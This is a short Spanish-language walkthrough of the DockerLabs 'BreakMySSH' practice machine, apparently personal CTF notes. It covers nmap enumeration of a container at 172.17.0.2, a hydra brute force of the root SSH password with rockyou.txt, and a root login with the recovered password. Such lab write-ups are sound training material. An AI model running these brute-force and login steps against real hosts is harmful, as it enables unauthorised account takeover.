# 🎯 BreakMySSH - DockerLabs

## 🔍 Fase 1: Enumeración

### Escaneo de puertos
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2`
![[Nmap6.png]]

### Escaneo de versiones
`sudo nmap -sCV -p22 172.17.0.2`
![[Nmap6.2.png]]

### Verificar métodos de autenticación
`sudo nmap --script ssh-auth-methods --script-args="ssh.user=root" 172.17.0.2 -p22`
![[Nmap6.3.png]]
**Resultado:**
`password` (soportado)

---

## 🔑 Fase 2: Fuerza bruta SSH

`hydra -l root -P /home/moon/Documents/WorldList/rockyou.txt 172.17.0.2 ssh`
![[Hydra6.png]]
**Resultado:**
`[22][ssh] host: 172.17.0.2 login: root password: estrella`

---

## 🚪 Fase 3: Acceso SSH

`ssh root@172.17.0.2`
Contraseña: `estrella`
![[Ssh6.png]]
### Verificar
`whoami`
`root`
![[DockerLabs/BreakMySSH/Root.png]]

---
